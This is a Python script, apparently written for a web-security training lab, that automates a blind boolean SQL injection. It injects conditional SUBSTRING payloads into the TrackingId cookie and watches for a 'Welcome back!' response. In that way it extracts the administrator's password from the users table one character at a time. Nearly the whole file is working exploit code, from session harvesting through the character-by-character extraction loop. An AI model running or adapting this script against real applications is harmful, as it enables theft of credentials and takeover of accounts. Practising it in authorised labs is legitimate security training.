import argparse
import logging
import re
import string
import sys
import requests
from typing import Tuple, Optional

# Configure logging once at the top of your script
# This will be overridden by parse_arguments if a loglevel is specified
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

def ask_to_continue(debug_mode: bool) -> bool:
    """
    Asks the user for confirmation to continue if debug_mode is enabled.

    Args:
        debug_mode (bool): If True, prompts the user. Otherwise, returns True immediately.

    Returns:
        bool: True if the user wants to continue or debug_mode is False, False otherwise.
    """
    if debug_mode:
        while True:
            answer = input("Do you want to continue? (Y/N): ").strip().lower()
            if answer == 'y':
                return True
            elif answer == 'n':
                return False
            else:
                logging.info("Invalid input. Please enter Y or N.")
    return True

def start_session(base_url: str) -> Optional[Tuple[str, str]]:
    """
    Starts a new HTTP session, retrieves session and TrackingId cookies.

    Args:
        base_url (str): The base URL of the target application.

    Returns:
        Optional[Tuple[str, str]]: A tuple containing (session_value, tracking_id) if successful,
                                   otherwise None.
    """
    session_url = base_url + "/"
    session = requests.Session()
    # Note: Using verify=False and proxies is common in lab/pentesting environments.
    # For production code, verify should typically be True and proxies configured securely.
    session.proxies.update({'https': 'http://127.0.0.1:8080'})

    try:
        response = session.get(session_url, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors (4xx or 5xx)
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to start session with {session_url}: {e}")
        return None

    logging.info(f"Session started. Status Code: {response.status_code}")
    logging.debug(f"Response Header: {response.headers}")

    cookie_header = response.headers.get('Set-Cookie', '')
    session_value_match = re.search(r'session=([^;]+)', cookie_header)
    tracking_id_match = re.search(r'TrackingId=([^;]+)', cookie_header)

    if not session_value_match:
        logging.error("Could not find 'session' cookie in response.")
        return None
    if not tracking_id_match:
        logging.error("Could not find 'TrackingId' cookie in response.")
        return None

    session_value = session_value_match.group(1)
    tracking_id = tracking_id_match.group(1)

    logging.debug(f"Extracted session: {session_value}")
    logging.debug(f"Extracted TrackingId: {tracking_id}")

    return session_value, tracking_id

def perform_conditional_sql_injection(
    base_url: str,
    session_cookie: str,
    tracking_id_cookie: str
) -> Optional[str]:
    """
    Performs a conditional SQL injection attack to extract the administrator's password.
    This function assumes a 'Welcome back!' message indicates a successful condition.

    Args:
        base_url (str): The base URL of the target application.
        session_cookie (str): The session cookie value.
        tracking_id_cookie (str): The TrackingId cookie value.

    Returns:
        Optional[str]: The extracted administrator password, or None if extraction fails or is interrupted.
    """
    characters_to_test = string.digits + string.ascii_letters
    logging.info(f"Characters to test: {characters_to_test}")

    extracted_password = ""
    position = 1
    logging.info(f"Starting conditional SQL injection against: {base_url}")
    logging.info("This may take a while depending on password length and response times.")

    try:
        while True:
            found_char_at_position = None
            for char in characters_to_test:
                # SQL injection payload for conditional response
                # Assumes 'administrator' username and a specific SQL structure
                payload = (
                    f"'+AND+(SELECT+SUBSTRING(password,{position},1)+FROM+users+"
                    f"WHERE+username%3d'administrator')%3d'{char}'--"
                )

                headers = {
                    'Cookie': f"TrackingId={tracking_id_cookie}{payload}; session={session_cookie}"
                }

                logging.debug(f"Testing payload: {payload}")
                logging.debug(f"Request Headers: {headers}")

                try:
                    response = requests.get(base_url, headers=headers, verify=False)
                    response.raise_for_status()
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed for char '{char}' at position {position}: {e}")
                    continue

                if "Welcome back!" in response.text:
                    logging.debug(f"Welcome back message detected for char '{char}' at position {position}!")
                    found_char_at_position = char
                    break
                else:
                    logging.debug(f"No welcome back message for char '{char}' at position {position}.")

            if found_char_at_position:
                extracted_password += found_char_at_position
                logging.info(f"Position {position}: '{found_char_at_position}' - Current password: {extracted_password}")
                position += 1
            else:
                logging.info(f"No character found at position {position}. Extraction complete.")
                break

        logging.info(f"Extracted administrator password: {extracted_password}")
        return extracted_password

    except KeyboardInterrupt:
        logging.info(f"\nExtraction interrupted by user. Partial password: {extracted_password}")
        return extracted_password
    except Exception as e:
        logging.critical(f"An unexpected error occurred during SQL injection: {e}")
        return None

def parse_arguments():
    """
    Parses command-line arguments for the script.
    """
    parser = argparse.ArgumentParser(
        description='Script for performing conditional SQL injection attacks.',
        epilog='Example: python3 script.py --t http://example.com --lhost 192.168.1.100 --loglevel DEBUG'
    )

    parser.add_argument(
        '--t',
        required=True,
        help='Target URL (e.g., http://192.168.144.234 or http://example.com)'
    )

    parser.add_argument(
        '--user',
        required=False,
        help='Username to authenticate (e.g., aaaa) - currently not used in SQLi logic.'
    )


    parser.add_argument(
        '--cookie',
        required=False,
        help='Admin cookie (optional) - currently not used, session/trackingid are extracted.'
    )

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug mode, prompting before each major step.'
    )


    parser.add_argument(
        '--loglevel',
        required=False,
        default='INFO',
        choices=['INFO', 'DEBUG', 'ERROR', 'WARNING', 'CRITICAL'],
        help='Set the logging level.'
    )

    return parser.parse_args()

def main():
    """
    Main function to orchestrate the SQL injection process.
    """
    args = parse_arguments()

    # Configure logging based on parsed arguments
    loglevel = getattr(logging, args.loglevel.upper(), logging.INFO)
    logging.getLogger().setLevel(loglevel) # Set the root logger level

    target_url = args.t
    debug_mode = args.debug

    logging.info("--- Starting session ---")
    if ask_to_continue(debug_mode):
        session_data = start_session(target_url)
        if session_data is None:
            logging.error("Failed to obtain session and tracking ID. Exiting.")
            sys.exit(1)
        session_value, tracking_id = session_data
    else:
        logging.info("Session start aborted by user. Exiting.")
        sys.exit(0)

    logging.info("--- Running conditional SQL injection ---")
    if ask_to_continue(debug_mode):
        admin_password = perform_conditional_sql_injection(target_url, session_value, tracking_id)
        if admin_password:
            logging.info(f"Successfully extracted administrator password: {admin_password}")
        else:
            logging.warning("Administrator password extraction failed or was interrupted.")
    else:
        logging.info("SQL injection aborted by user. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()

